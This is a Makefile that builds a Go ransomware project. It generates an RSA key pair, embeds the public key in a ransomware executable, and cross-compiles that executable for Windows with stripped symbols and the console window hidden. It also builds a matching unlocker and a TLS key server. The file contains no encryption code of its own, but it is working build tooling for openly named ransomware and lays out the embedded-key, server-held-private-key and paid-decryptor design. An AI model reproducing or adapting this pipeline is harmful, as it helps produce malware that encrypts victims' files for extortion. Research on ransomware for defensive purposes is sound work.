.PHONY: all deps

all: build

PROJECT_DIR=$(shell pwd)
BUILD_DIR=$(PROJECT_DIR)/build
BIN_DIR=$(PROJECT_DIR)/bin
SERVER_HOST=localhost
SERVER_URL=https://$(SERVER_HOST):8080
HIDDEN=-H windowsgui
LINKER_VARS=-X main.ServerBaseURL=$(SERVER_URL)

deps:
	go get -v github.com/Masterminds/glide
	glide install
	go get -u github.com/akavel/rsrc \
		github.com/jteeuwen/go-bindata/...

pre-build: clean-build clean-bin
	mkdir -p $(BUILD_DIR)/ransomware
	mkdir -p $(BUILD_DIR)/server
	mkdir -p $(BUILD_DIR)/unlocker
	openssl genrsa -out $(BUILD_DIR)/server/private.pem 4096
	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
	cd $(BUILD_DIR)/ransomware && go-bindata -pkg main -o public_key.go public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o $(BUILD_DIR)/ransomware/ransomware.syso
	cp $(BUILD_DIR)/ransomware/ransomware.syso $(BUILD_DIR)/unlocker/unlocker.syso
	cp -r cmd/ransomware $(BUILD_DIR)
	cp -r server $(BUILD_DIR)
	cp -r cmd/unlocker $(BUILD_DIR)
	cd $(BUILD_DIR)/server && env GOOS=linux go run $(GOROOT)/src/crypto/tls/generate_cert.go --host $(SERVER_HOST)
	mkdir -p $(BIN_DIR)
	mkdir -p $(BIN_DIR)/server

binaries:
	cd $(BUILD_DIR)/ransomware && GOOS=windows GOARCH=386 go build --ldflags "-s -w $(HIDDEN) $(LINKER_VARS)" -o $(BIN_DIR)/ransomware.exe
	cd $(BUILD_DIR)/unlocker && GOOS=windows GOARCH=386 go build --ldflags "-s -w" -o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build && mv `ls|grep 'server\|key.pem\|cert.pem\|private.pem'` $(BIN_DIR)/server

build: pre-build binaries clean-build

clean-build:
	rm -r $(BUILD_DIR) || true

clean-bin:
	rm -r $(BIN_DIR) || true
